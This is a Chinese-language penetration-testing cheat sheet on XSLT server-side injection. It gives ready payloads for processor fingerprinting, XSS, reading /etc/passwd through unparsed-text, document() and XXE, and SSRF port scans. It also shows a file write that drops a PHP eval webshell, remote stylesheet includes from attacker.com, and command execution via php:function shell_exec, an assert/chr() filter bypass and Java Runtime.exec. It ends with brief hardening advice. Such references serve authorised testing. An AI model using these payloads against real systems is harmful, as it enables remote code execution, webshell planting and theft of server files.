

# XSLT 服务端注入 (XSLT Server Side Injection)

## 0x01 基础信息

XSLT (Extensible Stylesheet Language Transformations) 是一种用于将 XML 文档转换为 HTML、XML 或文本格式的语言。

- **核心组件**：由 **XSLT 处理器**（如 Libxslt, Xalan, Saxon）完成转换。
- **常见处理器**：
  - **Libxslt** (Gnome/PHP)
  - **Xalan** (Apache/Java)
  - **Saxon** (Saxonica/.NET/Java)
- **漏洞前提**：应用程序允许用户控制 XSL 模板内容（如上传 .xsl 文件或在 ESI 标签中指定外部样式表），处理器在解析时执行了恶意指令。

------

## 0x02 指纹识别 (Fingerprinting)

识别处理器版本是构造 Payload 的第一步，因为扩展函数（如 RCE 相关的函数）高度依赖厂商实现。

**识别 Payload：**

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
 Version: <xsl:value-of select="system-property('xsl:version')" /><br />
 Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
 Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
 <xsl:if test="system-property('xsl:product-name')">
 Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
 </xsl:if>
</xsl:template>
</xsl:stylesheet>
```

------

## 0x03 核心漏洞利用

## 3.1 XSS

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<script>confirm("We're good");</script>
</xsl:template>
</xsl:stylesheet>

```

### 3.2 任意文件读取 (Arbitrary File Read)

- **方法 A：unparsed-text (XSLT 2.0+)**

  `<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>`

- **方法 B：document() 函数**

  `<xsl:value-of select="document('/etc/passwd')"/>`

- **方法 C：经典 XXE 方式**

  ```xml
  <!DOCTYPE xxe [<!ENTITY ext SYSTEM "file:///etc/passwd">]>
  <xsl:template match="/">&ext;</xsl:template>
  ```

### 3.3 服务端请求伪造 (SSRF)

利用包含或文档加载函数探测内网：

- **探测/包含**：`<xsl:include href="http://127.0.0.1:8080/xslt"/>`
- **端口扫描**：`<xsl:value-of select="document('http://192.168.1.1:22')"/>`

### 3.4 任意文件写入 (File Write)

- **Saxon (XSLT 2.0)**：

  ```xml
  <xsl:result-document href="shell.php">
      <xsl:text><![CDATA[<?php eval($_POST[1]); ?>]]></xsl:text>
  </xsl:result-document>
  ```

- **Xalan-J 扩展**：

  ```xml
  <redirect:write file="local_file.txt">Payload Content</redirect:write>
  ```

------

## 0x04 远程 XSL 包含与调用（进阶）

这是绕过本地限制或配合 ESI 注入的常用手段。

### 4.1 `<xsl:include>` (服务端包含)

用于在 XSL 文件内部引用外部模块，可将复杂的 RCE Payload 放在攻击者服务器上。

```xml
<xsl:include href="http://attacker.com/external.xsl"/>
```

### 4.2 `<?xml-stylesheet ?>` (指令处理 PI)

在 XML 文件头部声明，诱导处理器或浏览器加载样式表。

```xml
<?xml-stylesheet type="text/xsl" href="http://attacker.com/ext.xsl"?>
```

------

## 0x05 远程代码执行 (RCE)

### 5.1 PHP 场景 (`php:function`)

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
<xsl:template match="/">
  <xsl:value-of select="php:function('shell_exec','whoami')" />
  <xsl:value-of select="php:function('scandir','.')" />
</xsl:template>
</xsl:stylesheet>
```

### 5.2 进阶：PHP `assert` 隐蔽利用

使用 `chr()` 绕过针对路径字符串的简单过滤：

```xml
<xsl:copy-of select="php:function('assert','var_dump(scandir(chr(46).chr(47)))')" /> 
```

### 5.3 进阶：调用 PHP 类中的静态方法 (Advanced)

标准的 `php:function` 默认不仅可以调用 PHP 内置函数，还可以通过 `类名::方法名` 的语法调用当前 PHP 环境中已加载的任何类的**静态方法**。

- **语法格式**：`<xsl:value-of select="php:function('ClassName::methodName', 'arg1', 'arg2')" />`
- **实战意义**：
  - **绕过黑名单**：如果 WAF 拦截了 `system` 或 `shell_exec`，但没有拦截 `YourCustomClass::runCommand`。
  - **业务逻辑操纵**：直接调用后端定义的权限验证类、配置解析类或缓存清理类。

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
                xmlns:php="http://php.net/xsl" 
                version="1.0">
    <xsl:template match="root">
        <html>
            <xsl:value-of select="php:function('XSL::stringToUrl', 'une_superstring-àÔ|modifier')" />
        </html>
    </xsl:template>
</xsl:stylesheet>
```



### 5.3 其他语言 REC 利用

- [**https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection#C%23%2FVB.NET%2FASP.NET**](https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection#C%23%2FVB.NET%2FASP.NET) **（C#、Java、PHP）**

| **环境** | **处理器**  | **调用语法示例**                                             |
| -------- | ----------- | ------------------------------------------------------------ |
| **PHP**  | **Libxslt** | `php:function('ClassName::method')`                          |
| **Java** | **Xalan**   | `xmlns:myClass="http://xml.apache.org/xalan/java/java.lang.Runtime"` `myClass:getRuntime()` |
| **Java** | **Saxon**   | `xmlns:rt="java:java.lang.Runtime"` `rt:exec(rt:getRuntime(), 'whoami')` |

---

## 0x06 总结与防御建议 (朝花夕拾)

| **风险等级** | **利用方式**   | **核心函数/标签**                              |
| ------------ | -------------- | ---------------------------------------------- |
| **严重**     | **RCE**        | `php:function`, `Runtime.exec` (Java)          |
| **高危**     | **SSRF / LFI** | `document()`, `xsl:include`, `unparsed-text()` |
| **高危**     | **XXE**        | `<!DOCTYPE ... SYSTEM ...>`                    |

## 0x07 更多有效载荷

- **查看**： [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT Injection)
- **查看**： https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection

- **暴力破解检测字典**：https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xslt.txt

## 0x08🛡️ 职业实践建议

1. **禁用扩展**：在处理器配置中显式关闭 `setFeature` 中的外部实体支持及 Java/PHP 函数调用。
2. **白名单解析**：绝对不要将用户输入直接拼接进 XSL。
3. **审计重点**：在评估**政务/金融报表系统**（常涉及 XML 转 PDF）时，需重点测试导出功能是否存在 XSLT 注入。

## 0x09 参考文献

- https://hacktricks.wiki/zh/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations.html
  - [XSLT_SSRF](https://feelsec.info/wp-content/uploads/2018/11/XSLT_SSRF.pdf)
  - [http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf](http://repository.root-me.org/Exploitation - Web/EN - Abusing XSLT for practical attacks - Arnaboldi - IO Active.pdf)
  - [http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20Blackhat%202015.pdf](http://repository.root-me.org/Exploitation - Web/EN - Abusing XSLT for practical attacks - Arnaboldi - Blackhat 2015.pdf)

